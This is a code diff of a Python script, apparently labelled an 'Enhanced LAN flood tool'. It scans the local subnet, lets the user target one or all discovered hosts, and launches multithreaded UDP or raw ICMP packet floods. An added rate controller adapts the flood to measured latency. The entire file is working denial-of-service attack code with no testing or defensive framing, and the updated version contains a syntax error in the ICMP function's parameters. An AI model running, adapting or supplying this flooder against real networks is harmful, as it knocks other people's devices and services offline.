@@ -1,3 +1,4 @@
+```python
 #!/usr/bin/env python3
 import argparse
 import threading
@@ -7,190 +8,235 @@ import sys
 import time
 import subprocess
 import errno
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import asyncio
 
+from concurrent.futures import ThreadPoolExecutor
 from tqdm import tqdm
 from manuf import manuf
+import aioping  # pip install aioping
 
-def get_local_ip():
+# === Asynchronous LAN Scan ===
+async def async_ping(ip: str) -> bool:
+    try:
+        await aioping.ping(ip, timeout=1)
+        return True
+    except:
+        return False
+
+async def scan_lan_async() -> list[str]:
+    # Determine local /24 base
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         s.connect(("8.8.8.8", 80))
-        return s.getsockname()[0]
-    except Exception:
-        return None
+        local_ip = s.getsockname()[0]
+    except:
+        print("[-] Cannot determine local IP.")
+        sys.exit(1)
     finally:
         s.close()
+    parts = local_ip.split('.')[:3]
+    base = '.'.join(parts) + '.'
+    ips = [f"{base}{i}" for i in range(1,255) if f"{base}{i}" != local_ip]
+    tasks = [async_ping(ip) for ip in ips]
+    results = await asyncio.gather(*tasks)
+    return sorted([ip for ip, ok in zip(ips, results) if ok],
+                  key=lambda ip: list(map(int, ip.split('.'))))
 
-def ping_host(ip: str) -> bool:
-    return subprocess.run(
-        ["ping", "-c", "1", "-W", "1", ip],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    ).returncode == 0
-
-def scan_lan() -> list[str]:
-    local_ip = get_local_ip()
-    if not local_ip:
-        print("[-] Cannot determine local IP; check connectivity.")
-        sys.exit(1)
-
-    parts = local_ip.split(".")[:3]
-    base = ".".join(parts) + "."
-    ips = [base + str(i) for i in range(1, 255) if base + str(i) != local_ip]
-    live = []
-    with ThreadPoolExecutor(max_workers=100) as exe:
-        futures = {exe.submit(ping_host, ip): ip for ip in ips}
-        for f in tqdm(as_completed(futures),
-                      total=len(ips),
-                      desc="Scanning LAN",
-                      unit="host"):
-            if f.result():
-                live.append(futures[f])
-    return sorted(live, key=lambda ip: list(map(int, ip.split("."))))
-
+# === Vendor Resolution ===
 def resolve_vendors(hosts: list[str]) -> list[tuple[str,str,str]]:
-    proc = subprocess.run(["ip", "neigh"], capture_output=True, text=True)
+    proc = subprocess.run(["ip","neigh"], capture_output=True, text=True)
     neigh = {}
     for line in proc.stdout.splitlines():
         parts = line.split()
-        if len(parts) >= 5 and parts[2] == "lladdr":
+        if len(parts)>=5 and parts[2]=="lladdr":
             neigh[parts[0]] = parts[4]
     parser = manuf.MacParser()
-    results = []
+    out = []
     for ip in hosts:
-        mac = neigh.get(ip, None)
-        if not mac or mac.count(':') != 5:
+        mac = neigh.get(ip)
+        if not mac or mac.count(':')!=5:
             vendor = "Unknown"
         else:
             try:
                 vendor = parser.get_manuf(mac) or "Unknown"
-            except Exception:
+            except:
                 vendor = "Unknown"
-        results.append((ip, mac or "n/a", vendor))
-    return results
+        out.append((ip, mac or 'n/a', vendor))
+    return out
 
-def probe_udp_port(ip: str, port: int, timeout: float = 1.0) -> bool:
+# === UDP Port Probe ===
+def probe_udp_port(ip: str, port: int, timeout: float=1.0) -> bool:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(timeout)
-        sock.sendto(b"\x00", (ip, port))
-        try:
-            sock.recvfrom(1024)
-            return True
-        except socket.timeout:
-            return True
-        except socket.error as e:
-            return False if e.errno == errno.ECONNREFUSED else True
+        sock.sendto(b"",(ip,port))
+        sock.recvfrom(1024)
+        return True
+    except socket.timeout:
+        return True
+    except socket.error as e:
+        return False if e.errno==errno.ECONNREFUSED else True
     finally:
         sock.close()
 
 def pick_best_udp_port(ip: str) -> int:
     for p in [53,161,123,500,67,68]:
-        print(f"[*] Probing UDP/{p}… ", end="", flush=True)
-        if probe_udp_port(ip, p):
+        print(f"[*] Probing UDP/{p}…", end=' ')
+        if probe_udp_port(ip,p):
             print("open/filtered")
             return p
         print("closed")
-    print("[!] None responded; defaulting to random ports (0).")
+    print("[!] Fallback to random ports (0)")
     return 0
 
-def flood_thread(target_ip, port, size, deadline, counts_dict, key, tid, iface):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
-        if iface:
-            sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode()+b"\0")
-    except:
-        pass
+# === Dynamic Rate Controller ===
+class RateController:
+    def __init__(self, target_rtt_ms: float=50.0):
+        self.target = target_rtt_ms
+        self.rate = 1.0
+    def adjust(self, current_rtt: float) -> float:
+        if current_rtt > self.target:
+            self.rate *= 0.9
+        else:
+            self.rate *= 1.1
+        self.rate = max(0.1, min(self.rate, 10.0))
+        return self.rate
 
-    payload = random._urandom(size)
-    rnd = random.randint
-    dst = (target_ip, port)
-    sent = 0
-    while time.time() < deadline:
-        for _ in range(64):
+# === Flood Modes ===
+def flood_udp(ip, port, packet_size, duration, threads, iface, rate_ctrl):
+    counts = [0]*threads
+    deadline = time.time() + duration
+    def worker(tid):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
+            if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
+        except:
+            pass
+        payload = random._urandom(packet_size)
+        rnd = random.randint
+        batch = 64
+        next_adj = time.time()+1
+        dst = (ip,port)
+        sent = 0
+        while time.time()<deadline:
+            for _ in range(batch):
+                try:
+                    if port==0:
+                        sock.sendto(payload,(ip,rnd(1,65535)))
+                    else:
+                        sock.sendto(payload,dst)
+                    sent+=1
+                except:
+                    pass
+            if time.time()>=next_adj:
+                # measure RTT
+                try:
+                    out = subprocess.check_output(
+                        ["ping","-c","1","-W","1",ip],
+                        text=True)
+                    # parse time=
+                    t = float(out.split("time=")[1].split()[0])
+                except:
+                    t = rate_ctrl.target
+                r = rate_ctrl.adjust(t)
+                batch = int(64*r) or 1
+                next_adj += 1
+        counts[tid]=sent
+    for i in range(threads): threading.Thread(target=worker,args=(i,),daemon=True).start()
+    return counts
+
+
+def flood_icmp(ip, _, packet_size, duration, threads, iface, _):
+    counts=[0]*threads
+    import struct, os
+    ICMP_ECHO=8
+    def checksum(data: bytes):
+        if len(data)%2: data+=b"\0"
+        s=0
+        for i in range(0,len(data),2): s+=(data[i]<<8)+data[i+1]
+        s=(s>>16)+(s&0xffff); s+=s>>16
+        return (~s)&0xffff
+    def worker(tid):
+        try:
+            sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+            if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
+        except:
+            return
+        pid=os.getpid()&0xffff; seq=0; deadline=time.time()+duration; sent=0
+        while time.time()<deadline:
+            seq=(seq+1)&0xffff
+            hdr=struct.pack('!BBHHH',ICMP_ECHO,0,0,pid,seq)
+            payload=random._urandom(packet_size-len(hdr))
+            ch=checksum(hdr+payload)
+            pkt=struct.pack('!BBHHH',ICMP_ECHO,0,ch,pid,seq)+payload
             try:
-                if port == 0:
-                    sock.sendto(payload, (target_ip, rnd(1,65535)))
-                else:
-                    sock.sendto(payload, dst)
-                sent += 1
+                sock.sendto(pkt,(ip,0)); sent+=1
             except:
                 pass
-    counts_dict[key][tid] = sent
+        counts[tid]=sent
+    for i in range(threads): threading.Thread(target=worker,args=(i,),daemon=True).start()
+    return counts
 
+# Note: TCP SYN mode would require scapy; omitted for brevity
+
+# === Main ===
 def main():
-    parser = argparse.ArgumentParser(
-        description="LAN scan → auto-UDP-port pick → high-rate UDP flood"
-    )
-    parser.add_argument("--packet-size", "-s", type=int, help="bytes per packet")
-    parser.add_argument("--duration", "-d", type=int, help="flood duration (sec)")
-    parser.add_argument("--threads", "-t", type=int, help="threads per target")
-    parser.add_argument("--iface", "-i", default="", help="interface to bind")
-    parser.add_argument("--autoport", action="store_true",
-                        help="probe common UDP ports")
-    args = parser.parse_args()
+    p=argparse.ArgumentParser(description="Enhanced LAN flood tool")
+    p.add_argument("--mode",choices=["udp","icmp"],default="udp")
+    p.add_argument("--autoport",action="store_true")
+    p.add_argument("-s","--packet-size",type=int)
+    p.add_argument("-d","--duration",type=int)
+    p.add_argument("-t","--threads",type=int)
+    p.add_argument("-i","--iface",default="")
+    args=p.parse_args()
 
-    # Scan and list hosts + vendors
-    hosts = scan_lan()
-    info = resolve_vendors(hosts)
+    # async scan
+    hosts=asyncio.run(scan_lan_async())
+    info=resolve_vendors(hosts)
     print("\nLive hosts:")
-    for idx, (ip, mac, vendor) in enumerate(info, 1):
-        print(f"  {idx:3d}) {ip:16s}  {mac}  {vendor}")
+    for idx,(ip,mac,vendor) in enumerate(info,1):
+        print(f"  {idx:3d}) {ip:16s} {mac:17s} {vendor}")
     print("    0) ALL hosts")
+    sel=input(f"Select target (0–{len(info)}): ").strip()
+    if sel=="0": targets=[ip for ip,_,_ in info]
+    else: targets=[info[int(sel)-1][0]]
 
-    # Select target(s)
-    sel = input(f"Select target (0–{len(info)}): ").strip()
-    if sel == "0":
-        targets = [ip for ip, _, _ in info]
-    else:
-        i = int(sel) - 1
-        targets = [info[i][0]]
+    # port
+    port=0
+    if args.mode=="udp":
+        if args.autoport and len(targets)==1:
+            port=pick_best_udp_port(targets[0])
+    # params
+    if args.packet_size is None: args.packet_size=int(input("Packet size: "))
+    if args.duration is None: args.duration=int(input("Duration: "))
+    if args.threads is None: args.threads=int(input("Threads per target: "))
+    iface=args.iface or None
 
-    # Port selection
-    if args.autoport and len(targets) == 1:
-        port = pick_best_udp_port(targets[0])
-    else:
-        port = 0
+    print(f"\n[*] Mode={args.mode} Targets={len(targets)} Port={port} "
+          f"Size={args.packet_size} Duration={args.duration}s Threads={args.threads} "
+          f"Iface={iface or 'default'}")
 
-    # Packet size / duration / threads
-    if args.packet_size is None:
-        args.packet_size = int(input("Packet size (bytes): ").strip())
-    if args.duration is None:
-        args.duration = int(input("Duration (sec): ").strip())
-    if args.threads is None:
-        args.threads = int(input("Threads per target: ").strip())
-    iface = args.iface or None
-
-    print(f"\n[*] Flooding {len(targets)} target(s) on UDP/{port} "
-          f"size={args.packet_size} dur={args.duration}s "
-          f"threads/target={args.threads} iface={iface or 'default'}\n")
-
-    # Prepare counts
-    counts = {ip: [0]*args.threads for ip in targets}
-    deadline = time.time() + args.duration
-
-    # Launch threads for each target
+    rate_ctrl=RateController()
+    all_counts={}
+    # launch floods
     for ip in targets:
-        for tid in range(args.threads):
-            threading.Thread(
-                target=flood_thread,
-                args=(ip, port, args.packet_size, deadline, counts, ip, tid, iface),
-                daemon=True
-            ).start()
+        if args.mode=="udp":
+            counts=flood_udp(ip,port,args.packet_size,args.duration,args.threads,iface,rate_ctrl)
+        else:
+            counts=flood_icmp(ip,port,args.packet_size,args.duration,args.threads,iface,rate_ctrl)
+        all_counts[ip]=counts
 
-    # Progress bar for duration
-    for _ in tqdm(range(args.duration), desc="Flooding", unit="s"):
-        time.sleep(1)
+    # wait duration
+    for _ in tqdm(range(args.duration),desc="Flooding",unit="s"): time.sleep(1)
 
-    # Summarize
-    total = 0
-    print("\n[*] Flood complete. Packets sent per target:")
-    for ip, sent_list in counts.items():
-        s = sum(sent_list)
-        total += s
-        print(f"  {ip:16s} → {s:,} packets")
-    print(f"  Total across all targets: {total:,} packets")
+    # summary
+    total=0
+    print("\n[*] Complete. Packets sent:")
+    for ip,counts in all_counts.items():
+        s=sum(counts); total+=s
+        print(f"  {ip:16s} {s:,}")
+    print(f"  Grand total: {total:,}")
 
-if __name__ == "__main__":
-    main()
+if __name__=="__main__": main()
+```
